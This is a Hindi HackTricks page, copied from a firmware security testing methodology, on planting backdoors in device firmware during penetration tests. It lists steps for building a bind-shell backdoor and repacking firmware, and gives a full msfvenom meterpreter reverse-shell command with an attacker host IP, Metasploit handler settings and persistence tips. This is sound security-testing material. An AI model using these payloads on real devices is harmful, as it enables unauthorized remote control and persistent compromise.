<details>

<summary><strong>शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपोज़ में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>


### यह पृष्ठ [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/) से कॉपी किया गया था

**कस्टम फर्मवेयर और/या संकलित बाइनरीज़ अपलोड करने का प्रयास करें** अखंडता या हस्ताक्षर सत्यापन दोषों के लिए। उदाहरण के लिए, निम्नलिखित चरणों का उपयोग करके एक बैकडोर बाइंड शेल को संकलित करें जो बूट होने पर शुरू होता है।

1. फर्मवेयर-मॉड-किट (FMK) के साथ फर्मवेयर निकालें
2. लक्षित फर्मवेयर आर्किटेक्चर और एंडियननेस की पहचान करें
3. बिल्डरूट के साथ क्रॉस कंपाइलर बनाएं या अपने वातावरण के अनुकूल अन्य तरीके उपयोग करें
4. क्रॉस कंपाइलर का उपयोग करके बैकडोर बनाएं
5. निकाले गए फर्मवेयर /usr/bin में बैकडोर की प्रतिलिपि बनाएं
6. निकाले गए फर्मवेयर रूटफ़्स में उपयुक्त QEMU बाइनरी की प्रतिलिपि बनाएं
7. chroot और QEMU का उपयोग करके बैकडोर का अनुकरण करें
8. नेटकैट के माध्यम से बैकडोर से कनेक्ट करें
9. निकाले गए फर्मवेयर रूटफ़्स से QEMU बाइनरी को हटाएं
10. FMK के साथ संशोधित फर्मवेयर को फिर से पैक करें
11. फर्मवेयर विश्लेषण टूलकिट (FAT) के साथ बैकडोर फर्मवेयर का अनुकरण करके और नेटकैट का उपयोग करके लक्षित बैकडोर IP और पोर्ट से कनेक्ट करके परीक्षण करें

यदि डायनामिक विश्लेषण, बूटलोडर मैनिपुलेशन, या हार्डवेयर सुरक्षा परीक्षण के माध्यम से पहले से ही एक रूट शेल प्राप्त किया गया है, तो पूर्व-संकलित दुर्भावनापूर्ण बाइनरीज़ जैसे कि इम्प्लांट्स या रिवर्स शेल्स को निष्पादित करने का प्रयास करें। कमांड और कंट्रोल (C&C) फ्रेमवर्क्स के लिए उपयोग किए जाने वाले स्वचालित पेलोड/इम्प्लांट टूल्स का उपयोग करने पर विचार करें। उदाहरण के लिए, Metasploit फ्रेमवर्क और 'msfvenom' का उपयोग निम्नलिखित चरणों का उपयोग करके किया जा सकता है।

1. लक्षित फर्मवेयर आर्किटेक्चर और एंडियननेस की पहचान करें
2. उपयुक्त लक्ष्य पेलोड (-p), हमलावर होस्ट IP (LHOST=), सुनने वाले पोर्ट नंबर (LPORT=) फ़ाइलटाइप (-f), आर्किटेक्चर (--arch), प्लेटफ़ॉर्म (--platform linux या windows), और आउटपुट फ़ाइल (-o) निर्दिष्ट करने के लिए `msfvenom` का उपयोग करें। उदाहरण के लिए, `msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux`
3. पेलोड को समझौता किए गए डिवाइस पर स्थानांतरित करें (उदाहरण के लिए, एक स्थानीय वेबसर्वर चलाएं और फाइलसिस्टम पर पेलोड को wget/curl करें) और सुनिश्चित करें कि पेलोड में निष्पादन अनुमतियां हैं
4. आने वाले अनुरोधों को संभालने के लिए Metasploit तैयार करें। उदाहरण के लिए, msfconsole के साथ Metasploit शुरू करें और ऊपर दिए गए पेलोड के अनुसार निम्नलिखित सेटिंग्स का उपयोग करें: use exploit/multi/handler,
* `set payload linux/armle/meterpreter_reverse_tcp`
* `set LHOST 192.168.1.245 #हमलावर होस्ट IP`
* `set LPORT 445 #कोई भी अप्रयुक्त पोर्ट हो सकता है`
* `set ExitOnSession false`
* `exploit -j -z`
5. समझौता किए गए डिवाइस पर मीटरप्रीटर रिवर्स 🐚 निष्पादित करें
6. मीटरप्रीटर सत्र खुलते देखें
7. पोस्ट एक्सप्लॉइटेशन गतिविधियां करें

यदि संभव हो, तो डिवाइस पर पुनरारंभ के बाद भी स्थायी पहुंच प्राप्त करने के लिए स्टार्टअप स्क्रिप्ट्स में एक भेद्यता की पहचान करें। ऐसी भेद्यताएं तब उत्पन्न होती हैं जब स्टार्टअप स्क्रिप्ट्स [प्रतीकात्मक लिंक](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data) करती हैं, या उन पर निर्भर करती हैं जो कोड अविश्वसनीय माउंटेड स्थानों जैसे कि एसडी कार्ड्स, और फ्लैश वॉल्यूम्स पर स्थित होते हैं जिनका उपयोग रूट फाइलसिस्टम्स के बाहर स्टोरेज डेटा के लिए किया जाता है।


<details>

<summary><strong>शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपोज़ में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
